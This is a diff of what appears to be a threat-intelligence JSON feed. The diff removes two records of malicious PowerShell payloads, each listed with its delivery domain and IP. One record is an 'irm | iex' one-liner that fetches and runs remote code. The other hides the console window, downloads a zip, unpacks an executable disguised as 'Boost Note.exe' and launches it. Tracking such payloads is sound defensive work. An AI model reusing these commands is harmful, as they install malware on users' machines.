@@ -1589,43 +1589,5 @@
     ],
     "ReportId": "cmwqceopr262s0omlc6bhnuqe",
     "ScannedAt": "2026-11-21T11:46:45.820000+00:00"
-  },
-  {
-    "UrlDomain": "castorinvestments.pl",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
-    ],
-    "IP": [
-      "92.222.139.190"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ben/1e715b77597ae0f6')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
-    ],
-    "ReportId": "cmwqapek9261d0omlk180kgle",
-    "ScannedAt": "2026-11-21T10:59:06.660000+00:00"
-  },
-  {
-    "UrlDomain": "innvantage.skstechsolution.us",
-    "DeliveryUrl": [
-      "friendsoftorreabbey.com"
-    ],
-    "PayloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "IP": [
-      "93.127.179.181"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "ReportId": "cmwqaak5m25zo0omla4vviesx",
-    "ScannedAt": "2026-11-21T10:47:34.100000+00:00"
   }
 ]
